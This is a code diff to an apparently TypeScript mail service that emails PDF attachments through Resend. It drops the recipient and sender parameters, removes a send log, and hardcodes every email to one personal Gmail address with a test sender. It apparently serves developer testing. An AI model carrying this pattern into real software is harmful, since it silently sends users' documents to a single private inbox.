@@ -9,12 +9,10 @@ export interface EmailAttachment {
 }
 
 export interface SendEmailOptions {
-  to: string | string[];
   subject: string;
   html?: string;
   text?: string;
   attachments?: EmailAttachment[];
-  from?: string;
 }
 
 @Injectable()
@@ -30,7 +28,7 @@ export class MailService {
     }
 
     this.resend = new Resend(resendApiKey);
-    this.defaultFromEmail = 'FazzTrack <no-reply@fazztrack.com>';
+    this.defaultFromEmail = 'Acme <onboarding@resend.dev>';
   }
 
   /**
@@ -38,14 +36,11 @@ export class MailService {
    * If more than 25 PDFs are provided, it will split them into multiple emails
    */
   async sendEmailWithPDFs(
-    to: string | string[],
     subject: string,
     pdfs: EmailAttachment[],
     htmlContent?: string,
     textContent?: string,
-    from?: string,
   ): Promise<void> {
-    const recipients = Array.isArray(to) ? to : [to];
     const MAX_ATTACHMENTS_PER_EMAIL = 25;
 
     // Validate PDFs
@@ -64,10 +59,6 @@ export class MailService {
 
     // Split PDFs into chunks if necessary
     const pdfChunks = this.chunkArray(validPdfs, MAX_ATTACHMENTS_PER_EMAIL);
-
-    this.logger.log(
-      `Sending ${validPdfs.length} PDFs in ${pdfChunks.length} email(s) to ${recipients.length} recipient(s)`,
-    );
 
     for (let i = 0; i < pdfChunks.length; i++) {
       const chunk = pdfChunks[i];
@@ -97,12 +88,10 @@ export class MailService {
 
       try {
         await this.sendEmail({
-          to: recipients,
           subject: emailSubject,
           html: htmlContent || defaultHtml,
           text: textContent || defaultText,
           attachments: chunk,
-          from: from || this.defaultFromEmail,
         });
 
         this.logger.log(
@@ -122,19 +111,15 @@ export class MailService {
    * Send a single email
    */
   async sendEmail(options: SendEmailOptions): Promise<void> {
-    const {
-      to,
-      subject,
-      html,
-      text,
-      attachments = [],
-      from = this.defaultFromEmail,
-    } = options;
+    const { subject, html, text, attachments = [] } = options;
+
+    const to = ['alexcordova111@gmail.com'];
+    const from = this.defaultFromEmail;
 
     try {
       const emailData: any = {
         from,
-        to: Array.isArray(to) ? to : [to],
+        to,
         subject,
       };
 
